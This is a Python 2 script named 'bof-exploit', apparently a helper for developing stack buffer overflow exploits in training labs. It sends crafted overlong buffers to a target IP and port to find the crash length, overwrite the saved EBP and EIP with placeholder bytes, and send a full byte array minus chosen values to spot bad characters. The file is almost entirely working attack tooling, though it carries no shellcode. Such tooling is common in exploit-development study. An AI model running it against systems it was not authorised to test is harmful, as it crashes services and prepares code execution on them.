#!/usr/bin/python

import socket,sys,argparse

char_fuzz=(
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
# remove bad chars from mona buffer 
def findGoodHex(bad_hex):
    new_mona_buffer=""
    bc=False
    if bad_hex == [None]:
        return char_fuzz

    bad_hex=bad_hex[0].split(",")
    for hex in char_fuzz:
        for hex2 in bad_hex:
            if ord(hex) == int(hex2,16):
                bc=True
                break
        if not bc:
            new_mona_buffer+=hex

        bc=False
    return new_mona_buffer

def sendPayload(buffer,ip,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((ip,port))
        s.settimeout(None)
        s.recv(1024)
        s.send(buffer)
        print "send payload to {}:{} with total length of {} .\n the last 20 bytes of the buffer are:\n {}"\
                .format(ip,port,len(buffer),\
                ":".join("{:02x}".format(ord(c)) for c in buffer[-20:]))
        sys.exit(0)
    except Exception:
        print Exception
        print "couldnt connect to {}:{}".format(ip,port)
        sys.exit(1)


def testEIP(func_to_fuzz,size,bad_chars,ip,port):
    EBP="BBBB"
    EIP="CCCC"
    RET="DDDD"
    buffer=func_to_fuzz+"A"*(size-12-len(func_to_fuzz)-2)+EBP+EIP+RET+"\r\n"
    sendPayload(buffer,ip,port) 

#check if app still responds at this val
def fuzzBreakPoint(func_to_fuzz,size,bad_chars,ip,port):
    buffer=func_to_fuzz+"A"*(size-len(func_to_fuzz)-2)+"\r\n"
    sendPayload(buffer,ip,port)

#fuzz for bad charackters after finding a way to crash a thread
def fuzzBadChars(func_to_fuzz,size,bad_chars,ip,port):
    EBP="BBBB"
    EIP="CCCC"
    RET="DDDD"
    buffer=func_to_fuzz+"A"*(size-12-len(func_to_fuzz)-2)+EBP+EIP+RET+findGoodHex(bad_chars)+"\r\n"
    sendPayload(buffer,ip,port)

    
if __name__=="__main__":
    FUNCTION_MAP={
                "fuzzbp" : fuzzBreakPoint,
                "fuzzbc" : fuzzBadChars,
                "testeip" : testEIP
                }
    parser = argparse.ArgumentParser(description='bof-exploit')
    parser.add_argument('-f',
                        required=True,
                        dest="func_to_fuzz",
                        help='function to fuzz for example "HELLO "')
    parser.add_argument('-l',
                        type=int,
                        required=True,
                        dest="length_of_buffer",
                        help='length of buffer')
    parser.add_argument('-i',
                        required=True,
                        dest="ip",
                        help='ip')
    parser.add_argument('-p',
                        type=int,
                        required=True,
                        dest="port",
                        help='port')


    parser.add_argument('-b',
                        dest="bad_chars",
                        help='bad chars for example "0x10,0x0a,0x0d"')

    
    #create subparser for which functions to call
    subparsers = parser.add_subparsers(help='func {}'.format(FUNCTION_MAP.keys()))
    func_parser=subparsers.add_parser("func")


    func_parser.add_argument('func',
                            choices=['fuzzbp','fuzzbc','testeip']
                            )
                                
    args = parser.parse_args()


    #there might be a better way to discard some of these parameters when calling the functions
    #but u would probaply have to create another function which discards some of te args (do tell me if u know a better way of doing this)

    FUNCTION_MAP[args.func](args.func_to_fuzz,args.length_of_buffer,[args.bad_chars],args.ip,args.port)
       
    
    
